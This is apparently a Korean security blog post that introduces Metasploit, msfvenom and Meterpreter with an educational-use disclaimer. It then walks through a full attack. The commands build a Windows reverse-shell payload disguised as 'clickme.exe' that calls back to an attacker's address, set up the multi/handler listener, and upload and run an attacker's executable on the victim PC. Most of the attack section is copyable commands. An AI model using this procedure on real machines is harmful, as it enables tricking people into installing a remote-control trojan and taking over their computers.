---
layout: post
title: Metasploit Meterpreter를 이용한 해킹 실습
categories: Tool
tags: Metasploit
---
# 목차
1. Disclaimer
1. Metasploit, msfvenom, meterpreter 란
1. PoC
1. 공격 코드 설명
- - -
  
# 1. Disclaimer
<span style="color:red">
All the content shown in this post is only for educational purposes. Any misuse of this content is completely at your own risk.
Do not try to attempt to break laws or do any illegal stuff by using this.

이 포스트에서 보여지는 모든 컨텐츠는 교육적인 목적으로만 제작되었습니다. 해당 컨텐츠를 오용한 결과는 전적으로 오용한 본인 책임입니다.
이 포스트에서 다루는 내용을 이용해 불법적인 일을 저지르려고 하지 마십시오.
</span>
- - -
# 2. Metasploit, msfvenom, meterpreter 란
## – Metasploit
메타스플로잇 프로젝트란 취약점 분석과 IDS 서명 개발 보조기구 등에 대한 정보를 제공하는 것을 목적으로 하고 있습니다. 2007년 루비에 의하여 재구조된 후, 2009년 10월 21일 Rapid7이라는 통일 취약성 관리 솔루션을 제공하는 보안 회사에 인수되었습니다.

칼리 리눅스에 메타스플로잇이 기본으로 설치되어있고, 실제로 직접 metasploit-framework 의 모듈 폴더를 보면 탑재된 모듈이 루비로 작성되어있다는 것을 확인할 수 있습니다.


메타스플로잇은 위와 같이 msfbinscan, msfconsole, msfd, msfdb, msfelfscan, msfmachscan, msfpescan, msfremove, msfrop, msfrpc, msfrpcd, msfupdate, msfvenom 이란 프로그램들로 구성되어 있습니다.  
여기서 ~scan이란 이름의 프로그램들은 익스플로잇 도구를 제작할 때 쓰이는 도구이고, 대부분 메타스플로잇을 사용한다고 하면 msfconsole이란 콘솔 커맨드라인 인터페이스를 의미합니다. msfconsole은 메타스플로잇의 대부분의 기능을 지원합니다.

## – msfvenom
위의 프로그램 중에 msfvenom이란 이름의 프로그램이 있습니다. 메타스플로잇의 커맨드라인 인스턴스로써 다양한 쉘 코드를 생성할 수 있습니다.  
예로, 공격자의 ip와 포트번호를 삽입하여 희생자 windows pc의 쉘을 따내는 프로그램을 제작하는데 사용됩니다.

## – meterpreter
메타스플로잇 공격은 주로 msfconsole -> search -> use -> info -> show options -> set -> exploit -> meterpreter 순으로 진행이 됩니다.  
여기서 미터프리터는 in-memory DLL인젝션을 사용한 페이로드로써, 최종적으로 희생자 pc의 exploit에 성공해서 미터프리터 세션이 맺어져 쉘 권한을 획득해 직접 희생자 pc에 명령을 내릴 수 있게 네트워크를 유지시켜줍니다.
- - -
# PoC
{% include youtube_embed.html id="G-3jJCqQ_m8" %}
- - -
# 4. 공격 코드 설명
{% highlight text %}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=7777 -f exe -o clickme.exe
{% endhighlight %}
msfvenom을 이용해 페이로드(-p)로 윈도우즈 미터프리터 리버스 커넥션을 맺습니다. 여기서 리버스 커넥션이란, 외부에서 내부로 들어오는 inbound 트래픽은 방화벽에서 막지만, 그 반대인 outbound 트래픽의 경우 대부분은 허용해주는 것을 이용해 내부망에서 외부망으로 거꾸로 접속을 하도록하는 쉘코드를 의미합니다.  
LHOST는 공격자 아이피이고 LPORT는 공격자 임의의 포트로 설정합니다.  
포맷(-f)은 exe로 윈도우즈 실행 프로그램이며, clickme.exe 형태로 페이로드를 저장합니다.

{% highlight text %}
msf5 > use exploit/multi/handler
{% endhighlight %}
{% highlight text %}
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
{% endhighlight %}
{% highlight text %}
msf5 exploit(multi/handler) > set lhost 192.168.xxx.xxx
{% endhighlight %}
{% highlight text %}
msf5 exploit(multi/handler) > set lport 7777
{% endhighlight %}
{% highlight text %}
msf5 exploit(multi/handler) > exploit
{% endhighlight %}
익스플로잇을 하고 희생자 pc에서 clickme.exe를 클릭하면 리버스 커넥션이 맺어졌다는 메시지와 함께 미터프리터 세션이 열렸다는 메시지를 받게 됩니다.

{% highlight text %}
meterpreter > sysinfo
{% endhighlight %}
미터프리터 세션을 이용해 희생자 pc의 시스템 정보를 알아냅니다.

{% highlight text %}
meterpreter > upload Warning.exe
{% endhighlight %}
Warning.exe라는, 공격자가 만들어낸 윈도우즈 실행파일을 희생자 pc에 업로드 시킵니다.

{% highlight text %}
meterpreter > execute -f Warning.exe
{% endhighlight %}
공격자가 임의로 Warning.exe를 실행시킵니다.